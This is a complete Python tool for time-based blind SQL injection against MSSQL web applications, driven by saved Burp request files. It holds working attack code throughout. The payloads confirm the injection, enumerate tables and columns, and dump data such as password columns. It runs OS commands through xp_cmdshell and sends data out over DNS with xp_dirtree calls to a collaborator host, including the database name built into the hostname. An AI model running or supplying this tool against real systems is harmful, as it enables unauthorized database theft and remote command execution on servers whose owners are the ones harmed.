"""
sqliManual.py — Generic MSSQL Time-Based Blind SQLi Tool
=========================================================
Takes a raw Burp .req file and a parameter name.
Handles GET and POST. Works with any app, not just one target.

USAGE:
  python sqliManual.py -r req.txt -p paramname --db
  python sqliManual.py -r req.txt -p paramname --tables --limit 5
  python sqliManual.py -r req.txt -p paramname --tables --limit all
  python sqliManual.py -r req.txt -p paramname -t TABLENAME
  python sqliManual.py -r req.txt -p paramname -t TABLENAME -c COLNAME --rows 10
  python sqliManual.py -r req.txt -p paramname --cmd "whoami"
  python sqliManual.py -r req.txt -p paramname --oob --collaborator x.oastify.com
  python sqliManual.py -r req.txt -p paramname --db --proxy http://127.0.0.1:8080
  python sqliManual.py -r req.txt -p paramname --db --delay 15 --threshold 10

HOW THE .req FILE WORKS:
  Save the raw request from Burp (Right click -> Save item, or copy from Raw tab).
  The file must look exactly like an HTTP request:

    POST /page.aspx HTTP/1.1
    Host: target.com
    Cookie: ASP.NET_SessionId=abc123
    Content-Type: application/x-www-form-urlencoded

    param1=value1&param2=value2&injectionparam=normalvalue

  The script will:
    1. Parse the method, host, path, headers, body from this file
    2. Find the parameter you specified with -p in the body (or URL for GET)
    3. Replace that parameter's value with each injection payload
    4. Send the request and measure response time
    5. Reconstruct DB strings from timing

KNOWN LIMITATIONS:
  - Only supports application/x-www-form-urlencoded and GET query strings
  - Does not support multipart/form-data (file upload forms)
  - Does not support JSON bodies (Content-Type: application/json)
  - HTTPS: uses the Host header from the file, assumes HTTPS if port 443
    Override with --scheme http or --scheme https
  - If the server uses anti-CSRF tokens that change per request,
    you need to implement token refresh (rare in time-based scenarios)
  - Cookies in the .req file expire — replace the file when session dies
  - VIEWSTATE in ASP.NET: the body is sent as-is from the file, so
    no double-encoding issues as long as you saved the raw request
"""

import requests
import string
import time
import urllib3
import urllib.parse
import argparse
import sys
import os
from datetime import datetime

urllib3.disable_warnings()

# ── Timing defaults (override with --delay / --threshold) ──────────────
DEFAULT_DELAY     = 10    # seconds DB will sleep when condition is TRUE
DEFAULT_THRESHOLD = 7.0   # response >= this = TRUE  (gap = buffer for jitter)
DEFAULT_TIMEOUT   = 25    # hard HTTP timeout per request

# ── Character set for linear scan ──────────────────────────────────────
# Uppercase first: MSSQL names are usually uppercase
# Add any characters you expect to see in your target data
CHARSET = string.ascii_uppercase + string.ascii_lowercase + string.digits + "_-@.\\/ :"

# ── Internal state ──────────────────────────────────────────────────────
WORKING_COMMENT = "-- -"   # auto-detected in verify()
_log_buffer     = []
LOG_FILE        = f"sqli_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
_proxy          = None
_delay          = DEFAULT_DELAY
_threshold      = DEFAULT_THRESHOLD
_timeout        = DEFAULT_TIMEOUT


# ╔══════════════════════════════════════════════════════════════════╗
# ║  LOGGING                                                        ║
# ╚══════════════════════════════════════════════════════════════════╝

def log(msg, show=True):
    ts = datetime.now().strftime("%H:%M:%S")
    _log_buffer.append(f"[{ts}] {msg}")
    if show:
        print(msg)

def log_evidence(label, payload, result):
    """Record one injection attempt with full context for incident response."""
    _log_buffer.append("")
    _log_buffer.append(f"  OBJECTIVE : {label}")
    _log_buffer.append(f"  PAYLOAD   : {payload}")
    _log_buffer.append(f"  RESULT    : {result}")
    _log_buffer.append("")

def save_log(target_url, param):
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        f.write("=" * 70 + "\n")
        f.write("MSSQL Time-Based Blind SQLi — Evidence Log\n")
        f.write(f"Generated  : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Target URL : {target_url}\n")
        f.write(f"Parameter  : {param}\n")
        f.write(f"Delay      : {_delay}s   Threshold: {_threshold}s\n")
        f.write(f"Comment    : {WORKING_COMMENT}\n")
        f.write("=" * 70 + "\n\n")
        f.write("TECHNIQUE: Time-Based Blind SQLi via Stacked Queries\n")
        f.write(f"Each payload: a'; IF (<condition>) WAITFOR DELAY '0:0:{_delay}';{WORKING_COMMENT}\n")
        f.write(f"TRUE  = response >= {_threshold}s\n")
        f.write(f"FALSE = response <  {_threshold}s\n\n")
        f.write("=" * 70 + "\n\n")
        for line in _log_buffer:
            f.write(line + "\n")
    print(f"\n  [log -> {LOG_FILE}]")


# ╔══════════════════════════════════════════════════════════════════╗
# ║  REQUEST FILE PARSER                                            ║
# ╚══════════════════════════════════════════════════════════════════╝

class ParsedRequest:
    """
    Holds everything extracted from a raw HTTP request file.

    Attributes:
        method  : "GET" or "POST"
        host    : from Host header e.g. "target.com"
        path    : URL path + query string e.g. "/page.aspx?x=1"
        headers : dict of all headers (excluding Host, handled separately)
        body    : raw body string exactly as in file (None for GET)
        scheme  : "https" or "http"
        full_url: constructed from scheme + host + path
    """
    def __init__(self):
        self.method   = "POST"
        self.host     = ""
        self.path     = "/"
        self.headers  = {}
        self.body     = None
        self.scheme   = "https"
        self.full_url = ""


def parse_req_file(filepath, scheme_override=None):
    """
    Parse a raw Burp request file into a ParsedRequest object.

    File format expected:
        METHOD /path HTTP/1.x
        Header1: value1
        Header2: value2
        [blank line]
        body (optional)

    Handles:
        - GET and POST
        - Any headers (Cookie, Content-Type, Authorization, etc.)
        - URL-encoded bodies (passes them through unchanged)
        - Both HTTP/1.0, HTTP/1.1, HTTP/2 request lines

    Does NOT handle:
        - Multipart bodies
        - Chunked transfer encoding
    """
    if not os.path.exists(filepath):
        print(f"ERROR: Request file not found: {filepath}")
        sys.exit(1)

    with open(filepath, "r", encoding="utf-8", errors="replace") as f:
        content = f.read()

    # Split on the first blank line — that separates headers from body
    # A blank line is \r\n\r\n or \n\n depending on how Burp saved it
    if "\r\n\r\n" in content:
        header_section, _, body_section = content.partition("\r\n\r\n")
        line_sep = "\r\n"
    else:
        header_section, _, body_section = content.partition("\n\n")
        line_sep = "\n"

    lines = header_section.split(line_sep)

    req = ParsedRequest()

    # ── Parse request line: METHOD /path HTTP/version ──────────────
    request_line = lines[0].strip()
    parts = request_line.split(" ")
    if len(parts) < 2:
        print(f"ERROR: Could not parse request line: {request_line!r}")
        sys.exit(1)

    req.method = parts[0].upper()
    req.path   = parts[1]  # includes query string if any

    # ── Parse headers ───────────────────────────────────────────────
    for line in lines[1:]:
        line = line.strip()
        if not line:
            continue
        if ":" not in line:
            continue
        key, _, val = line.partition(":")
        key = key.strip()
        val = val.strip()

        # Host header handled separately for URL construction
        if key.lower() == "host":
            req.host = val
        else:
            # Store all other headers — will be sent as-is
            req.headers[key] = val

    # ── Determine scheme ────────────────────────────────────────────
    if scheme_override:
        req.scheme = scheme_override
    elif ":443" in req.host or req.host.startswith("https"):
        req.scheme = "https"
    else:
        # Default to https — most modern apps use it
        # Override with --scheme http if needed
        req.scheme = "https"

    # Strip port from host if present (requests handles it separately)
    # e.g. "target.com:443" -> "target.com"
    clean_host = req.host.split(":")[0] if ":" in req.host else req.host
    # But keep non-standard ports
    if ":" in req.host:
        port = req.host.split(":")[1]
        if port not in ("80", "443"):
            clean_host = req.host  # keep e.g. target.com:8080

    req.full_url = f"{req.scheme}://{clean_host}{req.path}"

    # ── Body ─────────────────────────────────────────────────────────
    # Strip any trailing whitespace/newlines but keep internal encoding
    body = body_section.strip() if body_section else None
    req.body = body if body else None

    return req


# ╔══════════════════════════════════════════════════════════════════╗
# ║  PARAMETER INJECTION — the core of the tool                    ║
# ╚══════════════════════════════════════════════════════════════════╝

def inject_payload_in_body(body, param_name, payload):
    """
    Replace the value of param_name in a URL-encoded body string.

    Example:
        body      = "user=admin&search=hello&token=abc123"
        param     = "search"
        payload   = "a'; IF (1=1) WAITFOR DELAY '0:0:10';-- -"
        result    = "user=admin&search=a%27%3B+IF+%281%3D1%29+...&token=abc123"

    IMPORTANT:
        The body from the .req file is already URL-encoded (as the browser sent it).
        We find the parameter, replace only its value, re-encode only the new value.
        Everything else (VIEWSTATE, other params) stays exactly as the file had it.
        This avoids double-encoding.

    Handles:
        - param at start:  "param=val&other=x"
        - param in middle: "a=1&param=val&b=2"
        - param at end:    "a=1&param=val"
        - param with no value: "a=1&param=&b=2"

    Returns the modified body string.
    """
    # URL-encode the injection payload
    encoded_payload = urllib.parse.quote(payload, safe="")

    # We need to find "param_name=<value>" and replace <value>
    # The param name itself may be URL-encoded in the body
    # Try both plain and encoded versions of the param name
    candidates = [
        param_name,
        urllib.parse.quote(param_name, safe=""),
        urllib.parse.quote(param_name, safe="$"),  # ASP.NET $ names
    ]

    for candidate in candidates:
        # Build pattern: candidate=<anything until & or end>
        # We'll do it with string splitting for reliability
        # Split on &, find the matching pair, replace value
        pairs = body.split("&")
        new_pairs = []
        found = False

        for pair in pairs:
            if "=" in pair:
                k, _, v = pair.partition("=")
                if k == candidate:
                    # Replace this value with our payload
                    new_pairs.append(f"{k}={encoded_payload}")
                    found = True
                    continue
            new_pairs.append(pair)

        if found:
            return "&".join(new_pairs)

    # Parameter not found in body
    return None


def inject_payload_in_url(url, param_name, payload):
    """
    Replace parameter value in a URL query string (for GET requests).

    Example:
        url    = "https://target.com/search?q=hello&page=1"
        param  = "q"
        payload= "a'; IF (1=1) WAITFOR..."
        result = "https://target.com/search?q=a%27%3B+IF...&page=1"
    """
    parsed = urllib.parse.urlparse(url)
    # Parse the query string into a list of (key, value) pairs
    # Use parse_qsl to preserve order and handle duplicates
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)

    new_params = []
    found = False
    for k, v in params:
        if k == param_name:
            new_params.append((k, payload))  # urlencode will encode payload
            found = True
        else:
            new_params.append((k, v))

    if not found:
        return None

    # Rebuild the URL with modified query string
    new_query  = urllib.parse.urlencode(new_params)
    new_parsed = parsed._replace(query=new_query)
    return urllib.parse.urlunparse(new_parsed)


# ╔══════════════════════════════════════════════════════════════════╗
# ║  HTTP SEND                                                      ║
# ╚══════════════════════════════════════════════════════════════════╝

def send(req, param_name, payload):
    """
    Send one HTTP request with the injection payload substituted in.

    For POST: replaces param value in body, sends original body otherwise
    For GET:  replaces param value in URL query string

    Returns elapsed time in seconds.
    TRUE  if elapsed >= _threshold
    FALSE if elapsed <  _threshold
    """
    method  = req.method
    url     = req.full_url
    headers = dict(req.headers)   # copy so we don't mutate the original
    body    = req.body

    # ── Substitute payload ─────────────────────────────────────────
    if method == "POST":
        if body is None:
            log("  [!] POST request has no body — cannot inject")
            return 0.0

        modified_body = inject_payload_in_body(body, param_name, payload)
        if modified_body is None:
            # Try one more time with URL-decoded param name
            # (in case the .req file has encoded param names)
            decoded_param = urllib.parse.unquote(param_name)
            modified_body = inject_payload_in_body(body, decoded_param, payload)

        if modified_body is None:
            log(f"  [!] Parameter '{param_name}' not found in POST body.")
            log(f"      Body preview: {body[:200]}")
            log(f"      Check -p matches exactly one of the param names above.")
            return 0.0

        send_body = modified_body

    elif method == "GET":
        modified_url = inject_payload_in_url(url, param_name, payload)
        if modified_url is None:
            log(f"  [!] Parameter '{param_name}' not found in URL query string.")
            log(f"      URL: {url}")
            return 0.0
        url = modified_url
        send_body = None

    else:
        log(f"  [!] Unsupported method: {method}")
        return 0.0

    # ── Send the request ────────────────────────────────────────────
    try:
        t_start = time.time()
        requests.request(
            method  = method,
            url     = url,
            data    = send_body,     # None for GET, raw string for POST
            headers = headers,
            timeout = _timeout,
            verify  = False,         # ignore SSL cert errors (lab/CTF)
            proxies = _proxy,        # None = direct, dict = route through Burp
            allow_redirects = False, # don't follow 302 — we only measure time
        )
        return time.time() - t_start

    except requests.exceptions.Timeout:
        # Timeout = DB is sleeping = TRUE condition
        return float(_timeout)

    except Exception as e:
        log(f"  [!] Request error: {e}")
        return 0.0


def check(req, param_name, condition, comment=None):
    """
    Ask one boolean question.
    Builds the full WAITFOR payload, sends it, measures response time.
    Returns (triggered: bool, elapsed: float, full_payload: str)
    """
    c = comment or WORKING_COMMENT
    full_payload = f"a'; IF ({condition}) WAITFOR DELAY '0:0:{_delay}';{c}"
    elapsed  = send(req, param_name, full_payload)
    triggered = elapsed >= _threshold
    return triggered, elapsed, full_payload


# ╔══════════════════════════════════════════════════════════════════╗
# ║  VERIFY                                                         ║
# ╚══════════════════════════════════════════════════════════════════╝

def verify(req, param_name):
    """
    Confirm injection works before wasting time extracting.
    Tries three comment styles: -- -, --+-, --
    A comment style works if:
      TRUE  condition (1=1) -> response is slow
      FALSE condition (1=2) -> response is fast
    """
    global WORKING_COMMENT
    log("[*] Verifying injection...")
    log(f"    Parameter : {param_name}")
    log(f"    Expect    : 1=1 slow (~{_delay}s), 1=2 fast (<{_threshold}s)\n")

    for comment in ("-- -", "--+-", "--"):
        hit_t, e_t, p_t = check(req, param_name, "1=1", comment)
        hit_f, e_f, p_f = check(req, param_name, "1=2", comment)

        log(f"    comment={comment!r}   TRUE={e_t:.1f}s  FALSE={e_f:.1f}s")
        log_evidence("Verify TRUE  (1=1)", p_t,
                     f"{'TRIGGERED' if hit_t else 'not triggered'} ({e_t:.1f}s)")
        log_evidence("Verify FALSE (1=2)", p_f,
                     f"{'triggered=BAD' if hit_f else 'fast=correct'} ({e_f:.1f}s)")

        if hit_t and not hit_f:
            WORKING_COMMENT = comment
            log(f"\n    [+] Injection confirmed. Comment style: {comment!r}\n")
            return True

    # Diagnosis
    log("\n    [-] FAILED. Diagnosis:")
    log("    Both responses ~0.1s:")
    log("      (a) Parameter name is wrong — check -p matches exactly")
    log("      (b) Session expired — replace .req file with fresh request from Burp")
    log("      (c) VIEWSTATE mismatch — get fresh .req file")
    log("      (d) Parameter not used in SQL — try a different parameter")
    log("    Both responses slow:")
    log("      Server is naturally slow. Try --threshold 12 --delay 18")
    log("    One param not working, others might:")
    log("      Test each parameter individually with -p\n")
    return False


# ╔══════════════════════════════════════════════════════════════════╗
# ║  STRING EXTRACTION ENGINE                                       ║
# ╚══════════════════════════════════════════════════════════════════╝

def get_length(req, param_name, sql_expr, max_len=100, label=""):
    """
    Linear scan to find LEN(sql_expr).
    Linear is used (not binary search) because:
      - Binary search: one bad timing measurement = permanently wrong answer
      - Linear scan: one bad timing = skip one value = still finds correct answer
    """
    for n in range(1, max_len + 1):
        condition = f"LEN(({sql_expr}))={n}"
        hit, elapsed, payload = check(req, param_name, condition)
        log_evidence(f"{label} length={n}", payload,
                     f"{'HIT' if hit else 'miss'} ({elapsed:.1f}s)")
        print(f"    [{label}] length={n} ({elapsed:.1f}s)   ", end="\r")
        if hit:
            print()
            return n
    print()
    return 0


def get_char(req, param_name, sql_expr, position, label=""):
    """
    Linear scan through CHARSET to find character at position.
    Each attempt asks: ASCII(SUBSTRING(expr, pos, 1)) = ord(ch)?
    """
    for ch in CHARSET:
        condition = f"ASCII(SUBSTRING(({sql_expr}),{position},1))={ord(ch)}"
        hit, elapsed, payload = check(req, param_name, condition)
        log_evidence(f"{label} pos={position} '{ch}'", payload,
                     f"{'HIT' if hit else 'miss'} ({elapsed:.1f}s)")
        if hit:
            return ch
    return "?"  # char not in CHARSET — add it to CHARSET if you expect special chars


def extract_string(req, param_name, sql_expr, label=""):
    """Extract full string value of any SQL expression, character by character."""
    length = get_length(req, param_name, sql_expr, label=label)
    if not length:
        log(f"  [-] Could not get length for: {label}")
        return ""
    log(f"  [+] {label} length = {length}")
    result = ""
    for pos in range(1, length + 1):
        ch = get_char(req, param_name, sql_expr, pos, label=label)
        result += ch
        print(f"    [{label}] {pos}/{length} = '{ch}'  -> {result}   ", end="\r")
    print()
    log(f"  [+] {label} = '{result}'")
    log_evidence(f"FINAL {label}", sql_expr, result)
    return result


# ╔══════════════════════════════════════════════════════════════════╗
# ║  FEATURES                                                       ║
# ╚══════════════════════════════════════════════════════════════════╝

def get_db_info(req, param_name):
    log("\n[*] ── DATABASE NAME ─────────────────────────────────")
    name = extract_string(req, param_name, "DB_NAME()", label="DB_NAME")
    log(f"\n  DATABASE NAME : {name}")

    log("\n[*] ── TABLE COUNT ───────────────────────────────────")
    sql = ("SELECT COUNT(*) FROM information_schema.tables "
           "WHERE table_type='BASE TABLE'")
    tc_str = extract_string(req, param_name,
                            f"CAST(({sql}) AS VARCHAR(10))",
                            label="TABLE_COUNT")
    try:
        tc = int(tc_str.strip())
    except ValueError:
        tc = -1
    log(f"  TABLE COUNT   : {tc}")
    return name, tc


def get_table_at(req, param_name, index):
    """Get table name at alphabetical position 'index' using TOP N trick."""
    sql = (
        f"SELECT TOP 1 TABLE_NAME FROM "
        f"(SELECT TOP {index+1} TABLE_NAME FROM information_schema.tables "
        f"WHERE table_type='BASE TABLE' ORDER BY TABLE_NAME ASC) x "
        f"ORDER BY TABLE_NAME DESC"
    )
    return extract_string(req, param_name, sql, label=f"TABLE[{index}]")


def get_tables(req, param_name, limit):
    log(f"\n[*] ── TABLE NAMES (limit={limit}) ──────────────────")
    sql = ("SELECT COUNT(*) FROM information_schema.tables "
           "WHERE table_type='BASE TABLE'")
    tc_str = extract_string(req, param_name,
                            f"CAST(({sql}) AS VARCHAR(10))",
                            label="TABLE_COUNT")
    try:
        total = int(tc_str.strip())
    except ValueError:
        total = 50
    fetch = total if limit == "all" else min(int(limit), total)
    log(f"  Total: {total}   Fetching: {fetch}\n")
    tables = []
    for i in range(fetch):
        log(f"\n  [table {i+1}/{fetch}]")
        t = get_table_at(req, param_name, i)
        if t:
            log(f"    -> {t}")
            tables.append(t)
    log(f"\n  TABLES: {', '.join(tables)}")
    return tables


def get_col_at(req, param_name, table_name, index):
    sql = (
        f"SELECT TOP 1 COLUMN_NAME FROM "
        f"(SELECT TOP {index+1} COLUMN_NAME FROM information_schema.columns "
        f"WHERE TABLE_NAME='{table_name}' ORDER BY COLUMN_NAME ASC) x "
        f"ORDER BY COLUMN_NAME DESC"
    )
    return extract_string(req, param_name, sql,
                          label=f"{table_name}.col[{index}]")


def get_columns(req, param_name, table_name):
    log(f"\n[*] ── COLUMNS: {table_name} ─────────────────────────")
    sql = (f"SELECT COUNT(*) FROM information_schema.columns "
           f"WHERE TABLE_NAME='{table_name}'")
    cc_str = extract_string(req, param_name,
                            f"CAST(({sql}) AS VARCHAR(10))",
                            label=f"{table_name}_col_count")
    try:
        col_count = int(cc_str.strip())
    except ValueError:
        log("  [-] Could not get column count"); return []
    log(f"  Column count: {col_count}")
    cols = []
    for i in range(col_count):
        log(f"\n  [col {i+1}/{col_count}]")
        col = get_col_at(req, param_name, table_name, i)
        if col:
            log(f"    -> {col}")
            cols.append(col)
    log(f"\n  COLUMNS: {', '.join(cols)}")
    return cols


def dump_data(req, param_name, table_name, column_name, max_rows=5):
    log(f"\n[*] ── DUMP: {table_name}.{column_name} ─────────────")
    rc_str = extract_string(req, param_name,
                            f"CAST((SELECT COUNT(*) FROM {table_name}) AS VARCHAR(10))",
                            label=f"{table_name}_rows")
    try:
        total_rows = int(rc_str.strip())
    except ValueError:
        total_rows = max_rows
    fetch = min(total_rows, max_rows)
    log(f"  Total rows: {total_rows}   Dumping: {fetch}")
    rows = []
    for i in range(fetch):
        sql = (
            f"SELECT TOP 1 CAST({column_name} AS NVARCHAR(500)) FROM "
            f"(SELECT TOP {i+1} {column_name} FROM {table_name} "
            f"ORDER BY 1 ASC) x ORDER BY 1 DESC"
        )
        log(f"\n  [row {i+1}/{fetch}]")
        val = extract_string(req, param_name, sql,
                             label=f"{table_name}.{column_name}[{i}]")
        log(f"    {val}")
        rows.append(val)
    log(f"\n  DATA: {rows}")
    return rows


def exec_cmd(req, param_name, command):
    """
    Execute OS command via xp_cmdshell and read output.
    Output stored in global ##sqli_out temp table, read char-by-char.
    This is the only way to read RCE output on a blind injection without OOB.
    """
    log(f"\n[*] ── CMD: {command} ────────────────────────────────")
    setup = (
        "a'; "
        "IF OBJECT_ID('tempdb..##sqli_out') IS NOT NULL "
        "DROP TABLE ##sqli_out; "
        "CREATE TABLE ##sqli_out "
        "(id INT IDENTITY(1,1), line NVARCHAR(4000)); "
        f"INSERT INTO ##sqli_out EXEC xp_cmdshell '{command}'; "
        f"{WORKING_COMMENT}"
    )
    log("  [1/3] Running command...")
    log_evidence("xp_cmdshell setup", setup, "sent")
    elapsed = send(req, param_name, setup)
    log(f"    Response: {elapsed:.1f}s")

    log("  [2/3] Counting output lines...")
    rc_str = extract_string(
        req, param_name,
        "CAST((SELECT COUNT(*) FROM ##sqli_out WHERE line IS NOT NULL) AS VARCHAR(10))",
        label="cmd_lines"
    )
    try:
        line_count = int(rc_str.strip())
    except ValueError:
        log("  [-] Could not count lines — xp_cmdshell may be disabled"); return []

    log(f"    Output lines: {line_count}")
    if line_count == 0:
        log("  [-] No output"); return []

    log(f"  [3/3] Reading {line_count} lines...")
    lines = []
    for i in range(1, line_count + 1):
        log(f"\n  [line {i}/{line_count}]")
        val = extract_string(req, param_name,
                             f"SELECT line FROM ##sqli_out WHERE id={i}",
                             label=f"line[{i}]")
        log(f"    {val}")
        lines.append(val)

    log("\n  OUTPUT:")
    log("  " + "-" * 45)
    for l in lines:
        log(f"  {l}")
    log("  " + "-" * 45)
    return lines


def check_oob(req, param_name, collaborator):
    log(f"\n[*] ── OOB DNS CHECK ─────────────────────────────────")
    log(f"  Collaborator: {collaborator}")
    log("  Watch for DNS hits in Collaborator/interactsh.\n")
    payloads = [
        (f"a'; EXEC master..xp_dirtree '\\\\{collaborator}\\test';{WORKING_COMMENT}",
         "xp_dirtree"),
        (f"a'; EXEC master..xp_fileexist '\\\\{collaborator}\\test';{WORKING_COMMENT}",
         "xp_fileexist"),
    ]
    for payload, label in payloads:
        log(f"  Sending: {label}")
        log_evidence(f"OOB {label}", payload, "sent")
        elapsed = send(req, param_name, payload)
        log(f"    Response: {elapsed:.1f}s")
    log(f"\n  DNS exfil if OOB works:")
    log(f"  a'; EXEC xp_dirtree '\\\\'+DB_NAME()+'.{collaborator}\\x';{WORKING_COMMENT}")


# ╔══════════════════════════════════════════════════════════════════╗
# ║  DEBUG HELPER — show parsed request                            ║
# ╚══════════════════════════════════════════════════════════════════╝

def debug_show_request(req, param_name):
    """
    Show what the tool parsed from the .req file.
    Run with --debug to diagnose parameter-not-found errors.
    """
    print("\n[DEBUG] Parsed request:")
    print(f"  Method  : {req.method}")
    print(f"  URL     : {req.full_url}")
    print(f"  Headers : {req.headers}")
    if req.body:
        print(f"\n  Body ({len(req.body)} chars):")
        # Show each parameter on its own line for readability
        for pair in req.body.split("&"):
            if "=" in pair:
                k, _, v = pair.partition("=")
                marker = " <-- INJECTION TARGET" if k == param_name else ""
                print(f"    {k} = {v[:80]}{'...' if len(v)>80 else ''}{marker}")
            else:
                print(f"    {pair}")
    else:
        print("  Body    : (none — GET request)")

    print(f"\n  Looking for parameter: {param_name!r}")
    if req.body:
        found = any(
            pair.partition("=")[0] == param_name
            for pair in req.body.split("&")
            if "=" in pair
        )
        print(f"  Found in body: {'YES' if found else 'NO — check -p spelling'}")
    print()


# ╔══════════════════════════════════════════════════════════════════╗
# ║  CLI                                                            ║
# ╚══════════════════════════════════════════════════════════════════╝

def parse_args():
    p = argparse.ArgumentParser(
        description="Generic MSSQL Time-Based Blind SQLi tool — takes any .req file",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python sqliManual.py -r app.req -p search --db
  python sqliManual.py -r app.req -p search --tables --limit 5
  python sqliManual.py -r app.req -p search --tables --limit all
  python sqliManual.py -r app.req -p search -t USERS
  python sqliManual.py -r app.req -p search -t USERS -c password --rows 10
  python sqliManual.py -r app.req -p search --cmd "whoami"
  python sqliManual.py -r app.req -p search --oob --collaborator abc.oastify.com
  python sqliManual.py -r app.req -p search --db --proxy http://127.0.0.1:8080
  python sqliManual.py -r app.req -p search --debug
  python sqliManual.py -r app.req -p search --db --delay 15 --threshold 11
  python sqliManual.py -r app.req -p search --db --scheme http
        """
    )
    # Required
    p.add_argument("-r", "--request",   required=True,
                   help="Path to raw Burp request file e.g. request.req")
    p.add_argument("-p", "--param",     required=True,
                   help="Parameter name to inject into e.g. 'search' or 'txbGarageName'")

    # Actions
    p.add_argument("--db",             action="store_true",
                   help="Extract database name and table count")
    p.add_argument("--tables",         action="store_true",
                   help="List table names")
    p.add_argument("--limit",          default="5",
                   help="Number of tables to fetch, or 'all' (default: 5)")
    p.add_argument("-t","--table",
                   help="Table name — list its columns")
    p.add_argument("-c","--column",
                   help="Column name to dump (use with -t)")
    p.add_argument("--rows",           type=int, default=5,
                   help="Max rows to dump with -c (default: 5)")
    p.add_argument("--cmd",
                   help="OS command to run via xp_cmdshell e.g. 'whoami'")
    p.add_argument("--oob",            action="store_true",
                   help="Test OOB DNS exfil via xp_dirtree")
    p.add_argument("--collaborator",   default="YOUR.COLLABORATOR.HERE",
                   help="Burp Collaborator or interactsh domain for --oob")
    p.add_argument("--all",            action="store_true",
                   help="Run everything: db + all tables + all columns")

    # Connection
    p.add_argument("--proxy",
                   help="Proxy URL e.g. http://127.0.0.1:8080 (Burp)")
    p.add_argument("--scheme",         default=None, choices=["http","https"],
                   help="Force http or https (default: auto-detect from Host header)")

    # Timing
    p.add_argument("--delay",          type=int,   default=DEFAULT_DELAY,
                   help=f"WAITFOR delay seconds (default {DEFAULT_DELAY})")
    p.add_argument("--threshold",      type=float, default=DEFAULT_THRESHOLD,
                   help=f"Response time to count as TRUE (default {DEFAULT_THRESHOLD})")

    # Debug
    p.add_argument("--debug",          action="store_true",
                   help="Print parsed request and parameter locations then exit")

    return p.parse_args()


# ╔══════════════════════════════════════════════════════════════════╗
# ║  ENTRY POINT                                                    ║
# ╚══════════════════════════════════════════════════════════════════╝

if __name__ == "__main__":
    args = parse_args()

    # Apply timing settings globally
    _delay     = args.delay
    _threshold = args.threshold

    # Set up proxy
    if args.proxy:
        _proxy = {"http": args.proxy, "https": args.proxy}

    # Parse the request file
    req = parse_req_file(args.request, scheme_override=args.scheme)

    print("=" * 55)
    print(" MSSQL Time-Based Blind SQLi — Generic")
    print("=" * 55)
    log(f"Request file : {args.request}")
    log(f"URL          : {req.full_url}")
    log(f"Method       : {req.method}")
    log(f"Parameter    : {args.param}")
    log(f"Delay        : {_delay}s   Threshold: {_threshold}s")
    if _proxy:
        log(f"Proxy        : {args.proxy}")
    log(f"Log file     : {LOG_FILE}\n")

    # Debug mode — show parsed structure and exit
    if args.debug:
        debug_show_request(req, args.param)
        sys.exit(0)

    # Always verify before extracting
    if not verify(req, args.param):
        save_log(req.full_url, args.param)
        sys.exit(1)

    ran = False

    if args.all:
        get_db_info(req, args.param)
        tables = get_tables(req, args.param, "all")
        for t in tables:
            get_columns(req, args.param, t)
        ran = True

    if args.db and not args.all:
        get_db_info(req, args.param)
        ran = True

    if args.tables and not args.all:
        get_tables(req, args.param, args.limit)
        ran = True

    if args.table and not args.column and not args.all:
        get_columns(req, args.param, args.table)
        ran = True

    if args.table and args.column:
        dump_data(req, args.param, args.table, args.column, max_rows=args.rows)
        ran = True

    if args.cmd:
        exec_cmd(req, args.param, args.cmd)
        ran = True

    if args.oob:
        check_oob(req, args.param, args.collaborator)
        ran = True

    if not ran:
        print("\nNo action specified. Try:")
        print(f"  python sqliManual.py -r {args.request} -p {args.param} --db")
        print(f"  python sqliManual.py -r {args.request} -p {args.param} --tables --limit 5")
        print(f"  python sqliManual.py -r {args.request} -p {args.param} --debug")

    save_log(req.full_url, args.param)
    print("\nDone.")
